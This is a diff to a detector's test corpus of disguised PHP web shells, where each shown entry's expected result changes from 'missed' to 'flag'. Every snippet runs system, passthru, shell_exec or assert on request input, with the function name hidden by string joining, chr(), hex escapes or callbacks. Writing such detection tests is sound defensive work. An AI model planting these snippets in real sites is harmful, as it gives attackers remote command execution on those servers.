@@ -693,7 +693,7 @@ export const CORPUS = [
     path: `${P}/includes/class-runner.php`,
     group: "disguised",
     technique: "function name built by joining strings",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = 'sys' . 'tem';", "$f($_GET['c']);")
   },
   {
@@ -795,7 +795,7 @@ export const CORPUS = [
     path: `${P}/includes/filter.php`,
     group: "disguised",
     technique: "system passed by name as a callback",
-    expect: "missed",
+    expect: "flag",
     content: php("array_filter(array($_GET['c']), 'system');")
   },
   {
@@ -821,7 +821,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "function name joined with .= and called on a request value held in a variable",
-    expect: "missed",
+    expect: "flag",
     content: php("$n = 'pass';", "$n .= 'thru';", "$cmd = $_POST['cmd'];", "$n($cmd);")
   },
   {
@@ -829,7 +829,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "function name joined with implode",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = implode('', array('sh', 'ell', '_ex', 'ec'));", "echo $f($_REQUEST['q']);")
   },
   {
@@ -837,7 +837,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "function name built from chr() pieces",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = chr(115) . chr(121) . chr(115) . 'tem';", "$f($_COOKIE['k']);")
   },
   {
@@ -845,7 +845,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "joined name passed as a callback",
-    expect: "missed",
+    expect: "flag",
     content: php("call_user_func('ass' . 'ert', $_POST['x']);")
   },
   {
@@ -853,7 +853,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "system as a sort callback on request values held in a variable",
-    expect: "missed",
+    expect: "flag",
     content: php("$a = array($_POST['a'], $_POST['b']);", "usort($a, 'system');")
   },
   {
@@ -861,7 +861,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "system registered as a shutdown function with a request value",
-    expect: "missed",
+    expect: "flag",
     content: php("register_shutdown_function('system', $_GET['c']);")
   },
   {
@@ -869,7 +869,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "assert as a filter_var callback",
-    expect: "missed",
+    expect: "flag",
     content: php("filter_var($_REQUEST['c'], FILTER_CALLBACK, array('options' => 'assert'));")
   },
   {
@@ -877,7 +877,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "joined name called straight from brackets",
-    expect: "missed",
+    expect: "flag",
     content: php("('sys' . 'tem')($_GET['c']);")
   },
   {
@@ -885,7 +885,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "joined name with comments between the pieces and before the bracket",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = 'sys' /* a */ . 'tem';", "$f /* b */ ($_GET['c']);")
   },
   {
@@ -893,7 +893,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "function name held whole in a variable",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = 'system';", "$f($_GET['c']);")
   },
   {
@@ -901,7 +901,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "function name written with a hex escape",
-    expect: "missed",
+    expect: "flag",
     content: php('$f = "\\x73ystem";', "$f($_GET['c']);")
   },
   {
@@ -909,7 +909,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "joined name with a harmless reassignment inside a branch",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = 'sys' . 'tem';", "if (isset($_GET['plain'])) { $f = 'trim'; }", "echo $f($_GET['c']);")
   },
   {
@@ -917,7 +917,7 @@ export const CORPUS = [
     group: "disguised",
     set: "calls-by-name",
     technique: "joined name carried into a closure with use",
-    expect: "missed",
+    expect: "flag",
     content: php("$f = 'sys' . 'tem';", "$run = function () use ($f) { return $f($_POST['c']); };", "$run();")
   },
   {
